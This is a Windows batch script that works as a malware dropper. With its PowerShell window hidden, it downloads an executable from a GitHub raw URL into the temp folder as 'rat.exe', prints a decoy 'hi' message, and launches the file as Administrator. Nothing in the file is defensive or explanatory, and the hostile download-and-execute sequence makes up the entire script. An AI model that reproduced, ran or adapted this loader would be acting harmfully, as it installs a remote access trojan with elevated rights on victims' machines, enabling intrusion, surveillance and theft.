@echo off

:: Hide PowerShell execution completely
powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1

:: Display "hi" message
echo hi

:: Run the downloaded file as administrator
start /B "" runas /user:Administrator "%TEMP%\rat.exe"

endlocal
